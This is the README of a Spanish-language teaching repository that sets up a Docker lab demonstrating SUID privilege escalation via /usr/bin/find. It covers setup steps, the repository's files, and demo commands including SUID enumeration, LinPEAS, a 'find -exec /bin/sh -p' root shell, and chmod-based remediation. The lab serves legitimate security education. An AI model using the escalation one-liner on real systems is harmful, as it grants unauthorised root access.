# SUID Privilege Escalation Demo (Linux)

Este repositorio contiene un entorno de laboratorio aislado en **Docker** para demostrar de forma práctica y segura el **Caso 1: Abuso de un binario con bit SUID (`/usr/bin/find`)** en Linux, junto con diapositivas y guion pedagógico para presentaciones académicas.

---

## 🚀 Inicio Rápido (En cualquier máquina con Docker)

### 1. Clonar el repositorio
```bash
git clone https://github.com/fardenghi/suid-privilege-escalation-demo.git
cd suid-privilege-escalation-demo
```

### 2. Ejecutar el laboratorio
Asegúrate de tener **Docker Desktop** (o el servicio de Docker) en ejecución y corre:

```bash
# En macOS / Linux:
chmod +x run-lab.sh
./run-lab.sh
```

*(O usando Docker Compose directamente en cualquier sistema operativo):*
```bash
docker compose run --rm lab
```

Ingresarás automáticamente como el usuario no privilegiado `alumno` en el host `lab`:
```text
alumno@lab:~$
```

---

## 📂 Contenido del Repositorio

| Archivo / Carpeta | Descripción |
| :--- | :--- |
| [`GUIA_DEMO_CASO1.md`](GUIA_DEMO_CASO1.md) | **Guion completo paso a paso** para la exposición: comandos, explicaciones teóricas y notas de oratoria. |
| [`docs/index.html`](docs/index.html) | Presentación interactiva animada con canvas deep-space y tarjetas interactivas. |
| [`Dockerfile`](Dockerfile) | Definición del contenedor Ubuntu 22.04 con usuario `alumno` y `find` con bit SUID. |
| [`docker-compose.yml`](docker-compose.yml) | Configuración de Docker Compose para despliegue rápido. |
| [`run-lab.sh`](run-lab.sh) | Script bash para compilar y ejecutar el contenedor interactivamente. |
| [`tools/linpeas.sh`](tools/linpeas.sh) | Script oficial de auditoría LinPEAS precargado localmente (no requiere internet). |
| [`Escalamiento de Privilegios - Teoria y Casos Practicos.pdf`](Escalamiento%20de%20Privilegios%20-%20Teoria%20y%20Casos%20Practicos.pdf) | Documento teórico completo de la cátedra. |

---

## 🌐 Publicar la presentación con GitHub Pages

La carpeta `docs/` contiene la página de inicio (`index.html`). Para publicarla:

1. Subir estos cambios a la rama `main`.
2. En GitHub, abrir **Settings → Pages**.
3. En **Build and deployment**, elegir **Deploy from a branch**.
4. Seleccionar **main** y **/docs**, y guardar.

La presentación estará en <https://fardenghi.github.io/privilege-escalation-demo/>. Pages publicará el contenido de `docs/`, no los archivos del laboratorio que están en la raíz del repositorio.

---

## ⚡ Resumen de Comandos para la Demo

Una vez dentro del contenedor (`alumno@lab:~$`):

1. **Línea base (Identidad):**
   ```bash
   id
   cat /root/prueba_admin.txt   # Retorna: Permission denied
   ```

2. **Enumeración manual (Filtro por bit SUID 4000):**
   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ls -l /usr/bin/find          # Permisos: -rwsr-xr-x
   ```

3. **Enumeración automática con LinPEAS:**
   ```bash
   ./linpeas.sh -o interesting_perms_files
   ```
   *Resalta `/usr/bin/find` en **ROJO/AMARILLO** (alerta crítica basada en GTFOBins).*

4. **Fallo didáctico (Ejecución sin `-p`):**
   ```bash
   find . -exec /bin/sh \; -quit
   id                           # Sigue siendo alumno (la shell descarta privilegios si ruid != euid)
   exit
   ```

5. **Explotación correcta (Modo privilegiado con `-p`):**
   ```bash
   find . -exec /bin/sh -p \; -quit
   id                           # Muestra euid=0(root)
   cat /root/prueba_admin.txt   # Acceso concedido
   exit
   ```

6. **Remediación / Hardening (Defensa):**
   ```bash
   chmod u-s /usr/bin/find
   ls -l /usr/bin/find          # Pasa a -rwxr-xr-x (vector cerrado)
   ```

Para explicaciones teóricas completas, consultar [**`GUIA_DEMO_CASO1.md`**](GUIA_DEMO_CASO1.md).
